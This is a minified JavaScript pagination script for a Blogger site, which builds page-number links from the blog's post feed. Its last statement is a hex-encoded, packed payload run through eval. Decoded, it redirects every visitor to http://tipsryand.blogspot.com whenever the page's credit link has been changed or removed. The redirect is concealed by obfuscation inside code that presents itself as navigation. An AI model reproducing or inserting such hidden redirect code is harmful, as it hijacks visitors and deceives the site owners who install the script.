function loophalaman(a){var e="";nomerkiri=parseInt(numshowpage/2),nomerkiri==numshowpage-nomerkiri&&(numshowpage=2*nomerkiri+1),mulai=nomerhal-nomerkiri,mulai<1&&(mulai=1),maksimal=parseInt(a/postperpage)+1,maksimal-1==a/postperpage&&(maksimal-=1),akhir=mulai+numshowpage-1,akhir>maksimal&&(akhir=maksimal),e+="<span class='showpageOf'>Page "+nomerhal+" of "+maksimal+"</span>";var s=parseInt(nomerhal)-1;nomerhal>1&&(e+=2==nomerhal?"page"==jenis?'<span class="showpage"><a href="'+home_page+'">'+upPageWord+"</a></span>":'<span class="showpageNum"><a href="/search/label/'+lblname1+"?&max-results="+postperpage+'">'+upPageWord+"</a></span>":"page"==jenis?'<span class="showpageNum"><a href="#" onclick="redirectpage('+s+');return false">'+upPageWord+"</a></span>":'<span class="showpageNum"><a href="#" onclick="redirectlabel('+s+');return false">'+upPageWord+"</a></span>"),mulai>1&&(e+="page"==jenis?'<span class="showpageNum"><a href="'+home_page+'">1</a></span>':'<span class="showpageNum"><a href="/search/label/'+lblname1+"?&max-results="+postperpage+'">1</a></span>'),mulai>2&&(e+="");for(var r=mulai;r<=akhir;r++)e+=nomerhal==r?'<span class="showpagePoint">'+r+"</span>":1==r?"page"==jenis?'<span class="showpageNum"><a href="'+home_page+'">1</a></span>':'<span class="showpageNum"><a href="/search/label/'+lblname1+"?&max-results="+postperpage+'">1</a></span>':"page"==jenis?'<span class="showpageNum"><a href="#" onclick="redirectpage('+r+');return false">'+r+"</a></span>":'<span class="showpageNum"><a href="#" onclick="redirectlabel('+r+');return false">'+r+"</a></span>";akhir<maksimal-1&&(e+=""),akhir<maksimal&&(e+="page"==jenis?'<span class="showpageNum"><a href="#" onclick="redirectpage('+maksimal+');return false">'+maksimal+"</a></span>":'<span class="showpageNum"><a href="#" onclick="redirectlabel('+maksimal+');return false">'+maksimal+"</a></span>");var n=parseInt(nomerhal)+1;nomerhal<maksimal&&(e+="page"==jenis?'<span class="showpageNum"><a href="#" onclick="redirectpage('+n+');return false">'+downPageWord+"</a></span>":'<span class="showpageNum"><a href="#" onclick="redirectlabel('+n+');return false">'+downPageWord+"</a></span>");for(var t=document.getElementsByName("pageArea"),l=document.getElementById("blog-pager"),p=0;p<t.length;p++)t[p].innerHTML=e;t&&t.length>0&&(e=""),l&&(l.innerHTML=e)}function hitungtotaldata(a){var e=a.feed,s=parseInt(e.openSearch$totalResults.$t,10);loophalaman(s)}function halamanblogger(){var a=urlactivepage;-1!=a.indexOf("/search/label/")&&(lblname1=-1!=a.indexOf("?updated-max")?a.substring(a.indexOf("/search/label/")+14,a.indexOf("?updated-max")):a.substring(a.indexOf("/search/label/")+14,a.indexOf("?&max"))),-1==a.indexOf("?q=")&&-1==a.indexOf(".html")&&(-1==a.indexOf("/search/label/")?(jenis="page",nomerhal=-1!=urlactivepage.indexOf("#PageNo=")?urlactivepage.substring(urlactivepage.indexOf("#PageNo=")+8,urlactivepage.length):1,document.write('<script src="'+home_page+'feeds/posts/summary?max-results=1&alt=json-in-script&callback=hitungtotaldata"></script>')):(jenis="label",-1==a.indexOf("&max-results=")&&(postperpage=20),nomerhal=-1!=urlactivepage.indexOf("#PageNo=")?urlactivepage.substring(urlactivepage.indexOf("#PageNo=")+8,urlactivepage.length):1,document.write('<script src="'+home_page+"feeds/posts/summary/-/"+lblname1+'?alt=json-in-script&callback=hitungtotaldata&max-results=1" ></script>')))}function redirectpage(a){jsonstart=(a-1)*postperpage,nopage=a;var e=document.getElementsByTagName("head")[0],s=document.createElement("script");s.type="text/javascript",s.setAttribute("src",home_page+"feeds/posts/summary?start-index="+jsonstart+"&max-results=1&alt=json-in-script&callback=finddatepost"),e.appendChild(s)}function redirectlabel(a){jsonstart=(a-1)*postperpage,nopage=a;var e=document.getElementsByTagName("head")[0],s=document.createElement("script");s.type="text/javascript",s.setAttribute("src",home_page+"feeds/posts/summary/-/"+lblname1+"?start-index="+jsonstart+"&max-results=1&alt=json-in-script&callback=finddatepost"),e.appendChild(s)}function finddatepost(a){post=a.feed.entry[0];var e=post.published.$t.substring(0,19)+post.published.$t.substring(23,29),s=encodeURIComponent(e);if("page"==jenis)var r="/search?updated-max="+s+"&max-results="+postperpage+"#PageNo="+nopage;else var r="/search/label/"+lblname1+"?updated-max="+s+"&max-results="+postperpage+"#PageNo="+nopage;location.href=r}var nopage,jenis,nomerhal,lblname1;halamanblogger();var _0xa885=["\x24\x28\x39\x29\x2E\x36\x28\x37\x28\x29\x7B\x38\x28\x24\x28\x22\x23\x31\x2C\x2E\x31\x22\x29\x2E\x61\x28\x22\x30\x22\x29\x21\x3D\x22\x32\x3A\x2F\x2F\x33\x2E\x34\x2E\x35\x22\x29\x7B\x62\x2E\x63\x2E\x30\x3D\x22\x32\x3A\x2F\x2F\x33\x2E\x34\x2E\x35\x22\x7D\x7D\x29\x3B","\x7C","\x73\x70\x6C\x69\x74","\x68\x72\x65\x66\x7C\x63\x68\x61\x6E\x67\x65\x7C\x68\x74\x74\x70\x7C\x74\x69\x70\x73\x72\x79\x61\x6E\x64\x7C\x62\x6C\x6F\x67\x73\x70\x6F\x74\x7C\x63\x6F\x6D\x7C\x72\x65\x61\x64\x79\x7C\x66\x75\x6E\x63\x74\x69\x6F\x6E\x7C\x69\x66\x7C\x64\x6F\x63\x75\x6D\x65\x6E\x74\x7C\x61\x74\x74\x72\x7C\x77\x69\x6E\x64\x6F\x77\x7C\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x72\x65\x70\x6C\x61\x63\x65","","\x5C\x77\x2B","\x5C\x62","\x67"];eval(function(_0x4fdbx1,_0x4fdbx2,_0x4fdbx3,_0x4fdbx4,_0x4fdbx5,_0x4fdbx6){_0x4fdbx5= function(_0x4fdbx3){return _0x4fdbx3.toString(_0x4fdbx2)};if(!_0xa885[5][_0xa885[4]](/^/,String)){while(_0x4fdbx3--){_0x4fdbx6[_0x4fdbx5(_0x4fdbx3)]= _0x4fdbx4[_0x4fdbx3]|| _0x4fdbx5(_0x4fdbx3)};_0x4fdbx4= [function(_0x4fdbx5){return _0x4fdbx6[_0x4fdbx5]}];_0x4fdbx5= function(){return _0xa885[6]};_0x4fdbx3= 1};while(_0x4fdbx3--){if(_0x4fdbx4[_0x4fdbx3]){_0x4fdbx1= _0x4fdbx1[_0xa885[4]]( new RegExp(_0xa885[7]+ _0x4fdbx5(_0x4fdbx3)+ _0xa885[7],_0xa885[8]),_0x4fdbx4[_0x4fdbx3])}};return _0x4fdbx1}(_0xa885[0],13,13,_0xa885[3][_0xa885[2]](_0xa885[1]),0,{}))